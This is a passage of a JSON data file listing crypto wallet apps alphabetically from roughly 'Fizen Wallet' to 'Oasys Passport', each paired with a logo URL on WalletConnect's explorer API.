        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7e1514ba-932d-415d-1bdb-bccb6c2cbc00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Fizen Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1160bfa2-b669-42ba-b224-13edcd40c700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Fizz",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f9d4db84-2e9f-4fbe-684f-c1e921c98800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Flash Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ded6d2d1-85b0-4eac-5582-3aaeefa8ba00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Flow Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f67a1db8-5704-4353-ead8-bd85c02a8700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Flutter Sample Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/db10ede4-39c3-48ff-f85b-de9b5f17d000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "FoxWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d673068d-1acf-4372-76ee-8eb931c59e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Frame",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/29b4f569-c1e8-4144-132e-629bf5290f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Freedom World",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/cfeba020-3a45-4c42-e2ca-7c2720b16c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Freighter",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/12c9b230-917a-42e9-08cc-879dfb5de900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Frontier",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a78c4d48-32c1-4a9d-52f2-ec7ee08ce200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "FxWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/46a80541-e639-483d-e230-731fcbf13000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "GameStop Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c12536e0-dff1-4a1a-6c8f-c7247d6aa200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Gamic",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/cf404c15-391c-4144-1ec0-17f1b119ed00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "GateWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/6e528abf-7a7d-47bd-d84d-481f169b1200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Gaya Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/67e7c918-8cf2-4781-0a10-e7e6f4c48900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Gem Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/28f1b431-9d2a-4083-1bf8-5958939a2300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Gemini",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/56a3fd87-2627-4903-fddd-205224dac500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Gems Pocket",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/085ac257-f026-469d-4f6b-e947b6aa4a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "GoodDollar",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/371ab65b-e2c8-4843-f18a-cbcf2ba2ed00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Greenhood",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7b6aaa4d-fa17-4cc6-71e1-79f2e68c0900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Gridlock Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/471e6f61-b95a-453c-670c-029ef3b2bd00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Grindery Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fa1c7832-25ce-4c2d-2681-b52286a99200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Gryfyn",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/51bb1507-45a1-4d21-15f2-1cc2ebe69400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "GUARDIIAN Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4f095c1d-8a31-4af8-ab58-57e82a398e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "HaHa",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/79285c9f-2630-451e-0680-c71b42fb7400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "hAI by Hacken",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d2ff6baf-5051-4bf2-edec-32450b451000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Halo Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/80583973-8b44-4bef-0af9-099cfdbed600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "HAQQ Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/99fe539d-6a2a-4f52-2211-42fd04a9f300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "HARTi Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d0407f26-fe0b-4f3c-43c3-69bc8fef2e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "HashPack",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/8d55dd5a-7c9f-4929-d2d1-00564e41ac00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "HB WALLET",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f134f8a2-cf58-44dd-7626-dc2cd21a3800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Hellō",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d365f826-0a95-48f5-0642-e25cd47c2100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Hinkal Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9618af59-f333-4e56-09f1-dd1e24cca800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Hippo Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f9570968-45f7-47c1-3189-98cf60e25c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Holdstation Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/dba228fc-d0c9-497b-903e-843ad1076e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "HootArk",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c5f74b15-89cc-4f1f-8387-d3ffeb7a3400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "HOT Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/809867ce-345f-4180-033a-165019d4c700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Huddln",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7ba1571c-10c4-4284-b438-04dac27cb700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "HyperPay",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/44abbf25-f8c4-4d04-0ce7-a695e00d8e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "IApp",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/5da95e88-2d6c-4880-e6d8-b6a8d0663900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "IBVM Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a9b8d4c4-b6e1-4b2e-15c3-81331511c400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "icewal",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/bbfa8e6a-984d-4955-c919-8181e8bc9e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ID Pocket",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c227ee0a-5127-4707-ded9-c3cd81348d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "iMe Messenger & Crypto Wallet ",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1ba9d09a-f247-40a7-58d4-85a92db5f200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Imota ",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c81f5bbf-ce66-42bd-3436-f1baaaa18b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Impact Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/afc85418-2ca6-46cf-cfb9-daf6bc43e400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "imToken",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c84b4d9d-9525-4bb5-b373-934b46eafc00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "IndiGG",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/8e90a32f-130d-4317-7294-4884510aa300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Internet Money",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/204b2240-5ce4-4996-6ec4-f06a22726900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "ioPay",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/411d80d0-3a75-4932-560f-565d8c715e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "IPMB Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/846ae068-c112-412a-c103-7aa414bc9400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Jade Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/280cd57b-24f4-4700-8d53-94fe292fab00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Jambo",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b0fd39a1-d147-4bf7-4cb5-68a294b26f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Joey Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/eefe45e8-0a5e-421c-29d0-fd8191e7e600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "JOIN MOBILE APP",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/bd200406-7b27-452f-bb23-14e22ac47500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "JoyID Passkey",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/eef16f1f-1882-41c9-00c3-558444e0d000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Jupiter",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7601bec3-144f-4c9d-30a1-2d4a372ede00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Kabila Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e6263e25-7f31-4186-5ad4-75e17312c500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "KAMIYAGURA",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f826fb86-72ec-47cc-3e60-a6e694815500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "KAXAA Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2a7981aa-14f4-400d-86ae-ffa3ea866900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Kayros",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b2c3ae20-d3c9-4a47-16a1-a9862a410c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Keeper",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/41f6ac85-8f4e-4d9f-b37b-92b43fa7f400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "KeepKey Desktop",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/eb4227d9-366c-466c-db8f-ab7e45985500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Kelp",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1854e47d-3804-4e92-e455-06829b64b100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Keplr",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/750e0f10-0700-4ca5-7c0d-b4a55da72f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Key3",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/76bda797-d3e7-4dfe-ccf2-a940c5e8a700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Keychain",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2b6e9e4b-7dca-45dd-45d5-d96f45010200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "KEYRING PRO",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/dda0f0fb-34e8-4a57-dcea-b008e7d1ff00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "KGeN Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/77b4b806-d17e-4b24-597c-bc11c0a88100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Kigo",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ad83d869-de11-4685-2a24-d3ce93a86400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Klever Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2e181ba3-bf6f-4599-5349-f7409bc62100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Klip",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f7b6b2a6-ebe7-4779-6ad1-79a3142e6b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Koala Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/0d222367-ffaf-4402-3873-fdc80e521b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Komet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a2e9aaed-20f6-4da9-3ca3-448a1fc00b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Konio",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/305dadb1-395e-4ca8-d4d0-d8ad0cc37000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Kotlin Sample Internal Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2e3866ec-a700-48a2-2db8-7c6af6481900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Kraken Wallet ",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/8909e826-63e4-42b3-60b2-8a6a54060900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Kresus SuperApp",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ee242aea-3ffd-4ad8-db88-e29a1ccd2000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Kriptomat",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/774110aa-70f6-4d0c-210f-ab434838fa00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Kriptonio",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/331e57d3-d157-4bc3-8ea5-48a03f705e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "KryptoGO Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4eb31988-f494-403c-6127-cfcef036ac00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Krystal",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d2b59965-4eb8-4828-d3d4-fbc0b3379e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "KTC",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/42ea0ba3-df94-4305-6a52-1caba42a7000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "KuCoin Web3 Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/70d8a90b-457b-4c04-4bc3-791e97caab00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Leap",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d64ae9c7-c0be-495d-041e-35c6bb2cc100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Leather",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/0153454e-9313-4441-b6cf-838e3d023000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Ledger Live",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a7f416de-aa03-4c5e-3280-ab49269aef00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Legacy Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/ed181b1b-e4c0-4a2e-4a4c-f380a9f13c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "LegionNetwork",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/26044229-4a61-4b14-a2ed-5413fe435a00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Levain",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/504f6043-9d47-4dd9-5332-49ea67e93100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Libera",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9485d17f-c413-47fe-ebee-a876a9dc9100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "LichtBit",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f67b54c7-c5e2-4796-5bc6-eca4f3e6e800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Lif3 Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1a89c0ec-9059-4515-afb6-8204d49f0900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Life DeFi",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d249af4f-e9b8-498d-cbc3-9eab04568700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "LikerLand App",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/501fa316-f0df-4a1b-ead6-5523251b7100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Linen",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/aff3e4e1-92a9-4066-f48f-3591947cf200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "LOBSTR Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/0dafcaab-0852-47f7-85dd-436b86491d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "LocalTrade Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fcc60983-74ae-484a-4242-87cb6f05f100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Locker Token",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/37401d35-3fa1-451c-802d-604940315800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Lode Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/6442d532-b118-4286-1ee4-46624fefbf00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Loopring",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2103feda-4fc8-4635-76a7-02a4ed998000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "M1NTY",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/6ccb7754-acd8-4de2-797e-a587a53d3900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Magic Eden",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/62040f22-2ffd-4942-92fc-71ce68c64300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Marble",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/eb6de921-6824-4f35-6331-8a8b031e7100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MathWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/26a8f588-3231-4411-60ce-5bb6b805a700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MaxWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2f6e63fb-6443-4ac9-5978-85d61defb600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MDAO Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/82014e92-838b-4e75-e77e-76cdc5539d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Me Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e9666b15-4296-4384-3661-7e99a5f2a900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Meetwith",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b0145acf-d0a9-4c97-a77b-ed7ae301b100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MELDapp",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7946da4c-c8b7-4037-f044-8c3f7f1cb200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "meta-WONDER-verse",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/5cc6d96d-178d-42a6-cba1-ebd9d9415700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MetaMask",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/eebe4a7f-7166-402f-92e0-1f64ca2aa800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MetaWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/a18337ad-433f-47c0-ea57-8a6199835e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Meter Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/05700788-1b9d-4670-dabd-61fa9b90f900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MEW wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e2024511-2c9b-46d7-3111-52df3d241700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MG",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/84946308-413c-4191-5414-a325547a5c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "midoin",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9728246c-9504-4b0f-9881-ed848c9fa000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Minerva Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b57b2163-1bd8-4f6b-3311-470767e6d200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Mirai App",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/0c8022b0-d5a3-4561-64d5-a3e60d1ed500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Mixin Messenger",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c5516ab5-57c3-45ec-09e2-b149c9709600?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Modular Wallet Prod",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/70485da2-2568-463d-722c-25082997cc00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MON ID",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/1c34ae6b-76c9-4c88-4025-13e7b8a26d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Monarch Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c664d955-8a1e-4460-3917-4cfcf198f000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "mOne superapp",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/031df921-c5a5-451c-1ad4-f41d4f8fbb00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MoonPay Account",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/dd3fcf1c-6d23-4c0e-0170-899034585f00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MPCVault | Team crypto wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3cbf71ea-c90b-427c-6b2c-a9a7c7c0d500?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Multix",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f7b7e864-29a7-41c2-36b0-c96ef922da00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MUZA",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/f8516ff9-ca2e-4b59-65f6-ed8ef438f100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "My Cloud Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2fac85b3-85a3-4dd2-8e9d-8ea2cfa28100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "MyWalliD",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e6cff623-9671-4a39-acc7-1c2292d7e100?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "N3MUS",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/e0195490-4997-497a-8a97-751dd4e8a400?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Nabox",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/d7d52161-f9bb-455a-038e-9eca68536200?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Nash",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/65c53de2-05fd-4a62-5f9c-979dcb406c00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Neon Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/322bd6f0-09b5-4595-cb15-0dfab8054800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Nest Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/9f471f97-0b62-4af9-6198-fc9c4bd58000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "New GoodWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/c0758978-765a-4a61-8203-36a30d980d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Newmoney.AI",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/2736bfe5-65f6-4ca1-77bf-8b4a59f7a900?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "NewWallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/3a97d716-19e4-45c0-8cab-61664c0f3b00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Nicegram Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/929745a4-5830-480b-f6ab-bb3a854bc700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Nightly",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/7fb6e288-6d7e-4f29-d934-8b3f229c2d00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Nodle",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/39badb5c-adeb-4188-c803-a63a5cffdf00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "NoF",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/0f822531-ac3b-4cc0-d0da-c2ab57d0fe00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "NonBank",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fe06c7ed-3df1-4cc7-9686-c920914abd00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Noone Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/fbae89d3-d6cb-4b98-bd1c-b2007b61ed00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Nova Spektr",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/733e8649-3608-43d6-6956-167fb7eb8000?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Nova Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4f159b10-419b-483a-f2bf-da3d17855e00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "NOW Wallet",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/b6ee4efc-f53e-475b-927b-a7ded6211700?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "NuFi",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/65e07e9f-183a-4f6c-6ca5-4964eda1ef00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Nufinetes",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/4bb6c1ca-4196-4ba3-ece2-c3d335e1f800?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Numio",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/416ee463-6699-43f7-c0e3-396f0ad3d300?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
        "name": "Oasys Passport",
        "icon": "https://explorer-api.walletconnect.com/v3/logo/md/43eb1fb9-e0db-4c9b-d864-4d7fc5abcc00?projectId=080925ff734019202f8750b91ac5b373"
    },
    {
